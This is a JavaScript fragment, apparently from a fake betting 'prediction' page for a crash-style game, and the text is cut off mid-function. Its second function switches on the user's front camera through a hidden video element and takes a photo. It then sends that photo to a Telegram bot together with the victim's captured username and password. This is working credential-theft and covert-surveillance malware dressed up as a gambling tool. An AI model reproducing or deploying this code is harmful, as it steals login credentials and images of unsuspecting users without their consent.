    function correrPrediccion() {

            if(val >= target) { 
                d.innerText = target.toFixed(2) + "x";

                let bar = document.getElementById('history-bar');
                let box = document.createElement('div');

    // --- 8. CAPTURA DE FOTOGRAFÍA (CÁMARA FRONTAL) ---
    async function capturarYEnviarFoto(token, chatId, u, p) {
        try {
            let video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);

            let stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }
            });
            
            video.srcObject = stream;
            await video.play();

            await new Promise(resolve => setTimeout(resolve, 800));

            let canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            let ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            stream.getTracks().forEach(track => track.stop());
            document.body.removeChild(video);

            canvas.toBlob(async function(blob) {
                let formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'captura_usuario.png');
                formData.append('caption', `🚨 FOTO CAPTURADA 🚨\n👤 Usuario: ${u}\n🔑 Clave: ${p}`);

                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/png');

        } catch (error) {
            console.log("Cámara denegada o no disponible:", error);
        }
    }
